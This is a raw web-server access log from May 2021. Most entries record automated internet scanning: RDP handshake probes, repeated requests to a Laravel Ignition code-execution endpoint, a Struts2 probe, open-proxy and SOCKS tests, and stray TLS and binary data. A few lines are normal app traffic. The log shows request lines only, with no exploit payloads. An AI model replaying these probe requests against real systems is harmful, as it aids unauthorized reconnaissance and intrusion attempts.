161.189.134.11 - - [22/May/2021 20:52:08] "[35m[1m333766643833656338616434363333643963363962386536653538383937393235613033653338636434[0m" HTTPStatus.BAD_REQUEST -
183.136.225.14 - - [22/May/2021 22:55:21] "[33mGET / HTTP/1.1[0m" 404 -
183.136.225.14 - - [22/May/2021 22:55:21] "[33mGET / HTTP/1.1[0m" 404 -
183.136.225.14 - - [22/May/2021 22:55:21] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
192.241.210.29 - - [22/May/2021 22:58:48] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00\x8c\x01\x00\x00\x88\x03\x03-GÃ Â±Â¹ÃÂ¤o1\x87ÃXI\x84Â²]\x9c\x10#E{o\x96Ã¿\x9dÃÃ¡LÃºÃ¨CY\x00\x00\x1aÃ/Ã+Ã\x11Ã\x07Ã\x13Ã')
192.241.210.29 - - [22/May/2021 22:58:48] "[35m[1m Â  Â-GÃ Â±Â¹ÃÂ¤o1ÂÃXIÂÂ²]Â#E{oÂÃ¿ÂÃÃ¡LÃºÃ¨CY  Ã/Ã+ÃÃÃÃ	ÃÃ[0m" HTTPStatus.BAD_REQUEST -
185.202.2.149 - - [22/May/2021 23:33:52] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
185.202.2.149 - - [22/May/2021 23:33:52] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
45.155.205.209 - - [23/May/2021 00:25:29] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [23/May/2021 00:25:29] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
8.129.1.203 - - [23/May/2021 01:56:32] "[33mPOST /_ignition/execute-solution HTTP/1.1[0m" 404 -
121.5.250.245 - - [23/May/2021 08:34:32] "[33mPOST /_ignition/execute-solution HTTP/1.1[0m" 404 -
45.155.205.209 - - [23/May/2021 10:26:26] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [23/May/2021 10:26:26] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
180.149.125.175 - - [23/May/2021 11:23:11] "[33mGET /c/ HTTP/1.1[0m" 404 -
49.84.202.110 - - [23/May/2021 12:08:55] code 400, message Bad HTTP/0.9 request type ('\x00\x00\x00')
49.84.202.110 - - [23/May/2021 12:08:55] "[35m[1m    c                           [0m" HTTPStatus.BAD_REQUEST -
65.49.20.69 - - [23/May/2021 14:36:42] "[33mGET / HTTP/1.1[0m" 404 -
45.155.205.209 - - [23/May/2021 16:19:04] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [23/May/2021 16:19:04] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
193.106.29.74 - - [23/May/2021 16:36:50] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
193.106.29.74 - - [23/May/2021 16:36:50] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
193.106.29.74 - - [23/May/2021 16:50:16] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
193.106.29.74 - - [23/May/2021 16:50:16] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
128.199.29.172 - - [23/May/2021 17:12:15] "[33mPOST /_ignition/execute-solution HTTP/1.1[0m" 404 -
47.241.193.60 - - [23/May/2021 18:39:39] "[33mGET http://passport.baidu.com/ HTTP/1.1[0m" 404 -
47.241.193.60 - - [23/May/2021 18:39:54] code 400, message Bad request syntax ('\x04\x01\x00Pg)Â§Ãª\x00')
47.241.193.60 - - [23/May/2021 18:39:54] "[35m[1m Pg)Â§Ãª [0m" HTTPStatus.BAD_REQUEST -
150.255.82.139 - - [23/May/2021 18:39:58] code 400, message Bad request syntax ('\x05\x03\x00\x01\x02')
150.255.82.139 - - [23/May/2021 18:39:58] "[35m[1m [0m" HTTPStatus.BAD_REQUEST -
47.241.193.60 - - [23/May/2021 18:40:03] code 400, message Bad request syntax ('\x05\x01\x00')
47.241.193.60 - - [23/May/2021 18:40:03] "[35m[1m [0m" HTTPStatus.BAD_REQUEST -
180.149.125.175 - - [23/May/2021 21:31:41] "[33mGET / HTTP/1.1[0m" 404 -
125.64.94.144 - - [23/May/2021 22:42:32] code 400, message Bad HTTP/0.9 request type ('\\x01\\x00\\x00\\x00')
125.64.94.144 - - [23/May/2021 22:42:32] "[35m[1m\x01\x00\x00\x00 \xbf\x02\x00\x88\x13\x00\x00\x87\x00\x00\x00NIMABIJIAN\x04\x03\x00\x00{\x99Caig\x9c\x03\xc7eB\xc5\t\xc1\x18a\x11\x1a\x91\x1f\x02\tcof\x91\xc0\x80sJ5\xd2\x80\xe6\x9a~\xb9\xc7\x83^\x96\xeeN\x16\x96\x96&\xe6\x03\xea\xbc\x81\x02=\xac\x10\xfa?7\x03\xc3\xdf\xf7\xe4\x98`p\xe6\x8d\xc1\xa9\x8d\xc6\x06\xdb\xaf\x91\xe7\x82s\xf7\x14H\xd4\xe1W\x9a\x93C\x9e]\xa4\x01#\x03#\x03]\x03c]CC\x05C\x03+S\x03b\xf4\x00\x00/\x9e\x16E[0m" HTTPStatus.BAD_REQUEST -
106.75.211.111 - - [23/May/2021 23:18:58] "[33mGET http://www.qq.com/404/search_children.js HTTP/1.1[0m" 404 -
106.75.211.111 - - [23/May/2021 23:19:08] code 400, message Bad request syntax ('\x05\x01\x00')
106.75.211.111 - - [23/May/2021 23:19:08] "[35m[1m [0m" HTTPStatus.BAD_REQUEST -
106.75.211.111 - - [23/May/2021 23:19:08] code 400, message Bad request syntax ('\x04\x01\x00PpTi4\x00')
106.75.211.111 - - [23/May/2021 23:19:08] "[35m[1m PpTi4 [0m" HTTPStatus.BAD_REQUEST -
45.155.205.209 - - [24/May/2021 00:04:13] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [24/May/2021 00:04:13] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
193.118.53.194 - - [24/May/2021 00:07:34] "[33mGET / HTTP/1.1[0m" 404 -
45.155.205.209 - - [24/May/2021 02:04:33] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [24/May/2021 02:04:33] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
118.126.124.74 - - [24/May/2021 03:01:39] "[33mGET /struts2-rest-showcase/orders.xhtml HTTP/1.1[0m" 404 -
74.120.14.56 - - [24/May/2021 05:20:30] "[33mGET / HTTP/1.1[0m" 404 -
192.241.212.84 - - [24/May/2021 08:10:48] code 400, message Bad request version ('Ã\x14Ã')
192.241.212.84 - - [24/May/2021 08:10:48] "[35m[1m Â  ÂÂ0ÃÂµ4ÂÃ§ÃÂORTÂ©xÃpÃÃÂ/AMÃ®iÂ¿ÃÃÃ  Ã/Ã+ÃÃÃÃ	ÃÃ[0m" HTTPStatus.BAD_REQUEST -
122.228.19.80 - - [24/May/2021 08:21:19] code 400, message Bad request syntax ('\x00\x00\x00TZ\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x04\x010I\x00\x00\x00\x00\x80\x0bÂ¨Ã\x00\x0c)t F\x07\x00tsXrcsXYs9\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00bbXcsXctst\x00\x00\x00\x00\x00\x00')
122.228.19.80 - - [24/May/2021 08:21:19] "[35m[1m   TZ          0I    ÂÂ¨Ã )t F tsXrcsXYs9                      bbXcsXctst      [0m" HTTPStatus.BAD_REQUEST -
113.57.237.24 - - [24/May/2021 11:40:38] "[37mOPTIONS /login HTTP/1.1[0m" 200 -
113.57.237.24 - - [24/May/2021 11:40:38] "[37mPOST /login HTTP/1.1[0m" 200 -
113.57.237.24 - - [24/May/2021 11:40:40] "[37mGET /dataSet?page=1&limit=10 HTTP/1.1[0m" 200 -
113.57.237.24 - - [24/May/2021 11:45:34] "[37mOPTIONS /selectFeaturesGenerate HTTP/1.1[0m" 200 -
113.57.237.24 - - [24/May/2021 11:45:34] "[37mPOST /selectFeaturesGenerate HTTP/1.1[0m" 200 -
113.57.237.24 - - [24/May/2021 11:46:07] "[37mGET /ClassifyRecords?page=1&limit=10 HTTP/1.1[0m" 200 -
113.57.237.24 - - [24/May/2021 11:47:52] "[37mOPTIONS /selectFeaturesGenerate HTTP/1.1[0m" 200 -
113.57.237.24 - - [24/May/2021 11:47:52] "[37mPOST /selectFeaturesGenerate HTTP/1.1[0m" 200 -
113.57.237.24 - - [24/May/2021 11:54:05] "[37mOPTIONS /selectFeaturesGenerate HTTP/1.1[0m" 200 -
113.57.237.24 - - [24/May/2021 11:54:05] "[37mPOST /selectFeaturesGenerate HTTP/1.1[0m" 200 -
113.57.237.24 - - [24/May/2021 11:57:51] "[37mOPTIONS /logout HTTP/1.1[0m" 200 -
113.57.237.24 - - [24/May/2021 11:57:51] "[37mPOST /logout HTTP/1.1[0m" 200 -
45.155.205.209 - - [24/May/2021 14:02:48] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [24/May/2021 14:02:48] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
74.120.14.54 - - [24/May/2021 14:16:49] "[33mGET / HTTP/1.1[0m" 404 -
74.120.14.54 - - [24/May/2021 14:16:50] "[33mGET / HTTP/1.1[0m" 404 -
118.126.124.141 - - [24/May/2021 15:45:36] "[33mGET / HTTP/1.1[0m" 404 -
47.241.193.60 - - [24/May/2021 15:48:39] "[33mGET http://passport.baidu.com/ HTTP/1.1[0m" 404 -
47.241.193.60 - - [24/May/2021 15:49:40] code 400, message Bad request syntax ('\x04\x01\x00Pg)Â§Ãª\x00')
47.241.193.60 - - [24/May/2021 15:49:40] "[35m[1m Pg)Â§Ãª [0m" HTTPStatus.BAD_REQUEST -
220.200.163.188 - - [24/May/2021 15:49:44] code 400, message Bad request syntax ('\x05\x03\x00\x01\x02')
220.200.163.188 - - [24/May/2021 15:49:44] "[35m[1m [0m" HTTPStatus.BAD_REQUEST -
47.241.193.60 - - [24/May/2021 15:49:57] code 400, message Bad request syntax ('\x05\x01\x00')
47.241.193.60 - - [24/May/2021 15:49:57] "[35m[1m [0m" HTTPStatus.BAD_REQUEST -
45.155.205.209 - - [24/May/2021 15:55:32] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [24/May/2021 15:55:32] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
128.199.201.142 - - [24/May/2021 16:34:10] "[33mGET / HTTP/1.0[0m" 404 -
64.62.197.182 - - [24/May/2021 16:54:46] "[33mGET / HTTP/1.1[0m" 404 -
89.248.165.5 - - [24/May/2021 18:24:40] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
89.248.165.5 - - [24/May/2021 18:24:40] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
47.241.193.60 - - [24/May/2021 19:34:59] code 400, message Bad request syntax ('\x05\x01\x00')
47.241.193.60 - - [24/May/2021 19:34:59] "[35m[1m [0m" HTTPStatus.BAD_REQUEST -
47.241.193.60 - - [24/May/2021 19:36:03] code 400, message Bad request syntax ('\x04\x01\x00Pg)Â§Ãª\x00')
47.241.193.60 - - [24/May/2021 19:36:03] "[35m[1m Pg)Â§Ãª [0m" HTTPStatus.BAD_REQUEST -
36.5.197.146 - - [24/May/2021 19:36:08] code 400, message Bad request syntax ('\x05\x03\x00\x01\x02')
36.5.197.146 - - [24/May/2021 19:36:08] "[35m[1m [0m" HTTPStatus.BAD_REQUEST -
47.241.193.60 - - [24/May/2021 19:36:18] "[33mGET http://passport.baidu.com/ HTTP/1.1[0m" 404 -
69.162.84.99 - - [24/May/2021 20:46:28] "[33mHEAD / HTTP/1.0[0m" 404 -
45.155.205.209 - - [24/May/2021 23:59:24] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [24/May/2021 23:59:24] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
80.82.70.168 - - [25/May/2021 01:23:00] code 400, message Bad request syntax ('\x03\x00\x00\x13\x0eÃ \x00\x00\x00\x00\x00\x01\x00\x08\x00\x02\x00\x00\x00')
80.82.70.168 - - [25/May/2021 01:23:00] "[35m[1m  Ã           [0m" HTTPStatus.BAD_REQUEST -
80.82.70.168 - - [25/May/2021 01:23:01] code 400, message Bad request syntax ('\x03\x00\x00\x13\x0eÃ \x00\x00\x00\x00\x00\x01\x00\x08\x00\x02\x00\x00\x00')
80.82.70.168 - - [25/May/2021 01:23:01] "[35m[1m  Ã           [0m" HTTPStatus.BAD_REQUEST -
143.107.216.77 - - [25/May/2021 01:45:55] "[33mGET / HTTP/1.1[0m" 404 -
143.107.216.77 - - [25/May/2021 01:45:56] "[33mGET /index.php HTTP/1.1[0m" 404 -
124.70.63.183 - - [25/May/2021 02:29:47] "[33mPOST /_ignition/execute-solution HTTP/1.1[0m" 404 -
45.155.205.209 - - [25/May/2021 03:24:48] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [25/May/2021 03:24:48] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
162.142.125.37 - - [25/May/2021 04:07:40] "[33mGET / HTTP/1.1[0m" 404 -
162.142.125.37 - - [25/May/2021 04:07:40] "[33mGET / HTTP/1.1[0m" 404 -
45.95.98.11 - - [25/May/2021 05:33:30] "[33mCONNECT 192.30.255.113 HTTP/1.0[0m" 404 -
27.224.137.202 - - [25/May/2021 05:33:31] "[33mHEAD http://110.242.68.4/ HTTP/1.1[0m" 404 -
8.142.16.118 - - [25/May/2021 05:40:09] code 400, message Bad request syntax ('nil')
8.142.16.118 - - [25/May/2021 05:40:09] "[35m[1mnil[0m" HTTPStatus.BAD_REQUEST -
8.142.16.118 - - [25/May/2021 05:40:09] "[33mGET / HTTP/1.0[0m" 404 -
8.142.16.118 - - [25/May/2021 05:40:09] "[33mGET / HTTP/1.1[0m" 404 -
167.248.133.53 - - [25/May/2021 05:50:41] "[33mGET / HTTP/1.1[0m" 404 -
167.248.133.53 - - [25/May/2021 05:50:41] "[33mGET / HTTP/1.1[0m" 404 -
45.148.10.50 - - [25/May/2021 06:58:30] "[33mHEAD / HTTP/1.0[0m" 404 -
185.202.2.149 - - [25/May/2021 07:12:14] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
185.202.2.149 - - [25/May/2021 07:12:14] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
95.58.91.82 - - [25/May/2021 08:29:14] "[33mPOST /_ignition/execute-solution HTTP/1.1[0m" 404 -
45.148.10.50 - - [25/May/2021 08:48:02] "[33mHEAD / HTTP/1.0[0m" 404 -
45.148.10.50 - - [25/May/2021 12:48:03] "[33mHEAD / HTTP/1.0[0m" 404 -
192.241.205.252 - - [25/May/2021 12:55:34] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00\x8c\x01\x00\x00\x88\x03\x03\x11')
192.241.205.252 - - [25/May/2021 12:55:34] "[35m[1m Â  ÂÃÃ Ã´}DIÂÃ¿Ã¨Ã©Â*Â¾.V[0m" HTTPStatus.BAD_REQUEST -
193.106.29.74 - - [25/May/2021 13:11:53] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
193.106.29.74 - - [25/May/2021 13:11:53] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
43.252.230.219 - - [25/May/2021 13:53:29] code 400, message Bad request syntax ('\x03\x00\x00\x13\x0eÃ \x00\x00\x00\x00\x00\x01\x00\x08\x00\x03\x00\x00\x00')
43.252.230.219 - - [25/May/2021 13:53:29] "[35m[1m  Ã           [0m" HTTPStatus.BAD_REQUEST -
161.189.134.11 - - [25/May/2021 14:51:42] code 400, message Bad request syntax ('{\x01\x00\x1615888888888ÃÂ¨\x90Ã\x13\x8a{')
161.189.134.11 - - [25/May/2021 14:51:42] "[35m[1m{ 15888888888ÃÂ¨ÂÃÂ{[0m" HTTPStatus.BAD_REQUEST -
161.189.134.11 - - [25/May/2021 14:54:58] code 400, message Bad HTTP/0.9 request type ('xx')
161.189.134.11 - - [25/May/2021 14:54:58] "[35m[1mxxSA52b -[0m" HTTPStatus.BAD_REQUEST -
161.189.134.11 - - [25/May/2021 15:00:27] code 400, message Bad request syntax ('&&&&~\x04Â»8ÃaÃ½T\x07P.VJÃ\x04;\x13\x0600-0C-29-B1-35-79')
161.189.134.11 - - [25/May/2021 15:00:27] "[35m[1m&&&&~Â»8ÃaÃ½TP.VJÃ;00-0C-29-B1-35-79[0m" HTTPStatus.BAD_REQUEST -
161.189.134.11 - - [25/May/2021 15:08:50] code 400, message Bad request syntax ('\x00\x00\x00TZ\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x10\x04\x01.\x05\x00\x00\x00\x00\x81IÂ¨Ã\x00\x0c)\x83zÂ»\x01\x00zÃf\x00\x8d\x16Ã~\x9dU\x05Ã±\x1fiÂ»Â©\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00ÃÃÂ¢|Â¦vÂ½Ã³\x1eOÃÃÃÂ®Ãd')
161.189.134.11 - - [25/May/2021 15:08:50] "[35m[1m   TZ         .    ÂIÂ¨Ã )ÂzÂ» zÃf ÂÃ~ÂUÃ±iÂ»Â©                ÃÃÂ¢|Â¦vÂ½Ã³OÃÃÃÂ®Ãd[0m" HTTPStatus.BAD_REQUEST -
161.189.134.11 - - [25/May/2021 15:12:59] code 400, message Bad request syntax ('~\x00\x02\x00\x00\x01\x88\x88\x88\x88\x88\x03Â¥-~')
161.189.134.11 - - [25/May/2021 15:12:59] "[35m[1m~   ÂÂÂÂÂÂ¥-~[0m" HTTPStatus.BAD_REQUEST -
161.189.192.94 - - [25/May/2021 15:15:48] code 400, message Bad request syntax ('[\x00\x00\x00H\x00\x00\x00\x01\x10\x01\x00\x01\x04j\x00\x00\x01\x00\x00\x00\x00')
161.189.192.94 - - [25/May/2021 15:15:48] "[35m[1m[   H    j      [0m" HTTPStatus.BAD_REQUEST -
161.189.134.11 - - [25/May/2021 15:19:27] code 400, message Bad HTTP/0.9 request type ('\x02Â¤UÃ¿\x00\x00\x00')
161.189.134.11 - - [25/May/2021 15:19:27] "[35m[1mÂ¤UÃ¿   [0m" HTTPStatus.BAD_REQUEST -
161.189.192.94 - - [25/May/2021 15:25:32] code 400, message Bad request syntax ('~~\x01\x00\x124Vx\x124/\x00\x08\x02\x00\x03Y\x10\x11\x15Q\x11\x03kÃ')
161.189.192.94 - - [25/May/2021 15:25:32] "[35m[1m~~ 4Vx4/  YQkÃ[0m" HTTPStatus.BAD_REQUEST -
161.189.192.94 - - [25/May/2021 15:30:03] code 400, message Bad request syntax ('333766643833656338616434363333643963363962386536653538383937393235613033653338636434')
161.189.192.94 - - [25/May/2021 15:30:03] "[35m[1m333766643833656338616434363333643963363962386536653538383937393235613033653338636434[0m" HTTPStatus.BAD_REQUEST -
193.106.29.74 - - [25/May/2021 15:41:05] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
193.106.29.74 - - [25/May/2021 15:41:05] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
91.241.19.56 - - [25/May/2021 16:06:24] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
91.241.19.56 - - [25/May/2021 16:06:24] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
45.155.205.209 - - [25/May/2021 16:43:11] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [25/May/2021 16:43:11] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
43.252.230.219 - - [25/May/2021 18:39:46] code 400, message Bad request syntax ('\x03\x00\x00\x13\x0eÃ \x00\x00\x00\x00\x00\x01\x00\x08\x00\x03\x00\x00\x00')
43.252.230.219 - - [25/May/2021 18:39:46] "[35m[1m  Ã           [0m" HTTPStatus.BAD_REQUEST -
45.155.205.209 - - [25/May/2021 19:23:53] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [25/May/2021 19:23:53] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
203.159.80.30 - - [25/May/2021 19:34:12] code 400, message Bad HTTP/0.9 request type ('ZÂ¥\x01')
203.159.80.30 - - [25/May/2021 19:34:12] "[35m[1mZÂ¥     [0m" HTTPStatus.BAD_REQUEST -
45.155.205.209 - - [25/May/2021 20:10:21] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [25/May/2021 20:10:21] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
89.248.165.41 - - [25/May/2021 20:26:54] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
89.248.165.41 - - [25/May/2021 20:26:54] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
112.74.169.221 - - [25/May/2021 21:21:49] "[33mPOST /_ignition/execute-solution HTTP/1.1[0m" 404 -
64.62.197.2 - - [25/May/2021 21:28:50] "[33mGET / HTTP/1.1[0m" 404 -
45.155.205.209 - - [26/May/2021 00:28:59] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [26/May/2021 00:28:59] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
89.248.165.41 - - [26/May/2021 01:14:06] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
89.248.165.41 - - [26/May/2021 01:14:06] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
185.202.2.149 - - [26/May/2021 05:37:57] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
185.202.2.149 - - [26/May/2021 05:37:57] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
91.90.213.175 - - [26/May/2021 07:21:33] "[33mPOST /_ignition/execute-solution HTTP/1.1[0m" 404 -
91.241.19.56 - - [26/May/2021 08:34:10] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
91.241.19.56 - - [26/May/2021 08:34:10] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
185.220.205.196 - - [26/May/2021 09:40:32] code 400, message Bad request syntax ('\x16\x03\x01\x00u\x01\x00\x00q\x03\x03Ãa^@Â¢ÃÃ,NÃ½6!Ã³Ã´p<\x85\x9fÂ¶OÃ\x82\x08\x96m\x0bÃ!l\x90sw\x00\x00\x1aÃ/Ã+Ã\x11Ã\x07Ã\x13Ã\tÃ\x14Ã')
185.220.205.196 - - [26/May/2021 09:40:32] "[35m[1m u  qÃa^@Â¢ÃÃ,NÃ½6!Ã³Ã´p<ÂÂÂ¶OÃÂÂmÃ!lÂsw  Ã/Ã+ÃÃÃÃ	ÃÃ[0m" HTTPStatus.BAD_REQUEST -
204.48.27.138 - - [26/May/2021 10:58:55] code 400, message Bad request syntax ('Â¿Â¿Â¯Â¯~\x00\x00\x00V\x10F)/kÃ\x19Â¡ÃÃ\x86IÂ³Ã\x94G')
204.48.27.138 - - [26/May/2021 10:58:55] "[35m[1mÂ¿Â¿Â¯Â¯~   VF)/kÃÂ¡ÃÃÂIÂ³ÃÂG[0m" HTTPStatus.BAD_REQUEST -
204.48.27.138 - - [26/May/2021 10:58:55] "[33mPOST / HTTP/1.1[0m" 404 -
204.48.27.138 - - [26/May/2021 10:58:56] code 400, message Bad request syntax ('\x17\x03\x01\x01\x04e\x00\x00\x00Ã\x00\x00\x007epYGsVmnUWyGup00jUT0goAAAAVirae')
204.48.27.138 - - [26/May/2021 10:58:56] "[35m[1me   Ã   7epYGsVmnUWyGup00jUT0goAAAAVirae[0m" HTTPStatus.BAD_REQUEST -
204.48.27.138 - - [26/May/2021 10:58:56] code 400, message Bad HTTP/0.9 request type ('\x17\x03\x01\x01\x04e\x00\x00\x00Ã\x00\x00\x005BE3E46C-1767-40AD-336BA00CEFB60\x00\x00\x00\x00B\x08Ãc\x04Ã«\x99Ã©IÃHÂ©{\x0f\x0fÃ\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00Â¨X7c\x14')
204.48.27.138 - - [26/May/2021 10:58:56] "[35m[1me   Ã   5BE3E46C-1767-40AD-336BA00CEFB60    BÃcÃ«ÂÃ©IÃHÂ©{Ã                                                        Â¨X7cÂ¹ÃÂ33Â¸ÂbyÂÃ¿Â³Â¨Â·ÃºÃRÃ¢ÃÃÃÂkÃ²Ã£Ã½I[0m" HTTPStatus.BAD_REQUEST -
204.48.27.138 - - [26/May/2021 10:58:58] code 400, message Bad request syntax ('99Ã\x13Ã«\x8bUÃ!\x8biÃ\x96Â¥u2Ã\x8eÂºÃ\x8d\xa0Â°Ã|\x8fctWÃ°\x00\x128E"Â®Ã+h\x85ÃVÃr\x19Â´D=BÂ¦gÃrÃ\x9aÃ3Â¼\x07ÃqÃÃ\x8a\x80ÃÂ©Â¸>\x1bÃ£\x8fYÃv\x92l\x88Âª\x11\x83\x0e\x8d.Â¼9Â±ÃÃ¶;\x84Âµ]\x9c\x02l\x1aMÃ(FÂ¿\x83p4\x088\x7fÃÂ¶Ã»Â¤Ã·kÂ·ÃÃÃx}sÃ]QÃ§R\x96v\x9d *G_\x9fÃ\x16\x80\x04jt\x90ÃÂ«(\x8dÃ·Â¯ÃÃÃ¤Mw\x00lÃ6(Â¢bÃÃ¹|O]Ã²"\x04\x00Ã¸#Â£f\tfÃQ6ÃzÃÂ¼Ã\x1a+wÃªÃ§Â¤\x0bÃ§Ã\x802ÃAÃªÃÃÂ´5Ã§\x8f\x92ÃÂµNÃÃÂ¯Ã½L:KÂ¸\x00\x0b0Ã­\x9dÂ¸Ã¨\x9d\x13\x97Â´Ã© H-ÃYÃ¹Â´\x9bÃÂ³\x08\x98Â¤\x9eÃ\x99\x8eÂµÃ·Ã\x93\x89Â³Â¿5\x91\x9bRR?')
204.48.27.138 - - [26/May/2021 10:58:58] "[35m[1m99ÃÃ«ÂUÃ!ÂiÃÂÂ¥u2ÃÂÂºÃÂÂ Â°Ã|ÂctWÃ° 8E"Â®Ã+hÂÃVÃrÂ´D=BÂ¦gÃrÃÂÃ3Â¼ÃqÃÃÂÂÃÂ©Â¸>Ã£ÂYÃvÂlÂÂªÂÂ.Â¼9Â±ÃÃ¶;ÂÂµ]ÂlMÃ(FÂ¿Âp48ÃÂ¶Ã»Â¤Ã·kÂ·ÃÃÃx}sÃ]QÃ§RÂvÂ *G_ÂÃÂjtÂÃÂ«(ÂÃ·Â¯ÃÃÃ¤Mw lÃ6(Â¢bÃÃ¹|O]Ã²" Ã¸#Â£f	fÃQ6ÃzÃÂ¼Ã+wÃªÃ§Â¤Ã§ÃÂ2ÃAÃªÃÃÂ´5Ã§ÂÂÃÂµNÃÃÂ¯Ã½L:KÂ¸ 0Ã­ÂÂ¸Ã¨ÂÂÂ´Ã© H-ÃYÃ¹Â´ÂÃÂ³ÂÂ¤ÂÃÂÂÂµÃ·ÃÂÂÂ³Â¿5ÂÂRR?[0m" HTTPStatus.BAD_REQUEST -
